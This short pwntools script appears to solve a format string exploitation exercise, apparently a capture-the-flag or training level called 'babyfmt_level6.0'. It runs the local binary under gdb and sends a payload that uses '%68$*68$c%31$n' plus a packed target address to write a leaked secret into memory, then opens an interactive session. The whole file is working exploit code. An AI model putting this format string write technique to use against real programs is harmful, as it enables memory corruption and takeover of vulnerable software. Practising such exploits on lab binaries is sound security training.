from pwn import * 

binary = './babyfmt_level6.0'

p = process(binary)

s = '''
b * printf
b * main+264
'''



gdb.attach(p, s)

# 0x   c8c5   6078  8cd2  5937


payload = flat(
	
	# secret value at position 68. Example 0x
	"%68$*68$c%31$n-------",
	"\x78\x41\x40\x00\x00\x00\x00\x00" # at position 31
	#"\x78\x00\x00\x00\x00\x00\x00\x00", # at position 32
)
p.sendline(payload)





p.interactive()
